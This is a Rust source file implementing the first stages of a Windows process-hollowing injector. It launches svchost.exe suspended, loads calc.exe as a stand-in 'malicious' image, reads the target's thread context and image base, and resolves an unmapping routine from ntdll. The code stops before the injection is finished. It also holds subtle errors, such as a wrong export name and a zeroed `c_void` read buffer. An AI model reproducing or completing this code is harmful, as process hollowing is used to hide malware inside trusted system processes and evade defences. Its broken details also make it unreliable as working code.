

use std::ffi::{CString, c_void};
use std::mem::transmute;
use std::ptr::{null, null_mut};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, TRUE, CloseHandle, GENERIC_READ};
use windows_sys::Win32::Storage::FileSystem::{CreateFileA, FILE_SHARE_READ, OPEN_EXISTING, GetFileSize, ReadFile};
use windows_sys::Win32::System::Diagnostics::Debug::{WriteProcessMemory, GetThreadContext,SetThreadContext, CONTEXT, ReadProcessMemory};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{THREADENTRY32, CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, Thread32First, Thread32Next};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::SystemServices::CONTEXT_AMD64;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Memory::*;
pub type HANDLE = isize;

pub const CONTEXT_CONTROL: i32 = CONTEXT_AMD64 | 0x01; 
pub const CONTEXT_INTEGER: i32 = CONTEXT_AMD64 | 0x02;
pub const CONTEXT_SEGMENTS: i32 = CONTEXT_AMD64 | 0x04; 
pub const CONTEXT_FLOATING_POINT: i32 = CONTEXT_AMD64 | 0x08;
pub const CONTEXT_DEBUG_REGISTERS: i32 = CONTEXT_AMD64 | 0x10;
pub const CONTEXT_ALL: i32 = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS;

pub fn hollowing_injector(){
    unsafe{

        let mut target_si:STARTUPINFOA = std::mem::zeroed();
        let mut target_pi: PROCESS_INFORMATION = std::mem::zeroed();

    
        CreateProcessA(
            b"C:/Windows/System32/svchost.exe\0".as_ptr(),
            null_mut(),
            null(), 
            null(), 
            TRUE,
            CREATE_SUSPENDED, 
            null(), 
            null(),
            &mut target_si, 
            &mut target_pi);

        let h_malicious_code = CreateFileA(
            b"C:/Windows/System32/calc.exe\0".as_ptr(),
            GENERIC_READ, 
            FILE_SHARE_READ, 
            null(), 
            OPEN_EXISTING , 
            0, 
            0);

        let maliciouse_file_size: u32 = GetFileSize(
            h_malicious_code, 
            &mut 0);

        let p_malicious_image = VirtualAlloc(
            null(), 
            maliciouse_file_size as usize,
            MEM_RESERVE | MEM_COMMIT, 
            PAGE_READWRITE);

        let mut number_of_byte_read = 0;
        let res = ReadFile(
            h_malicious_code, 
            p_malicious_image,
            maliciouse_file_size,
            &mut number_of_byte_read,
            null_mut());
        if res != 1 {
                panic!("[-] ReadFile failed: {}", GetLastError());
        }

        CloseHandle(h_malicious_code);
        let mut contexte: CONTEXT = std::mem::zeroed();
        contexte.ContextFlags = CONTEXT_ALL as u32;

        GetThreadContext(
            target_pi.hThread,
            &mut contexte);
        let mut p_target_image_base_addres:c_void = std::mem::zeroed();

        ReadProcessMemory(
            target_pi.hProcess,
            transmute(contexte.Rbx+8), 
            &mut p_target_image_base_addres,
            std::mem::size_of::<c_void>() as usize, 
            &mut 0);

        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll == 0 {
                panic!("[-]LoadLibraryA failed: {}!", GetLastError());
        }
        let fn_pZwUnmapViewOfSection = GetProcAddress(ntdll, b"pZwUnmapViewOfSection\0".as_ptr());

        let pZwUnmapViewOfSection: extern "C" fn(*mut c_void, isize) -> HANDLE =
            transmute(fn_pZwUnmapViewOfSection);

    }


}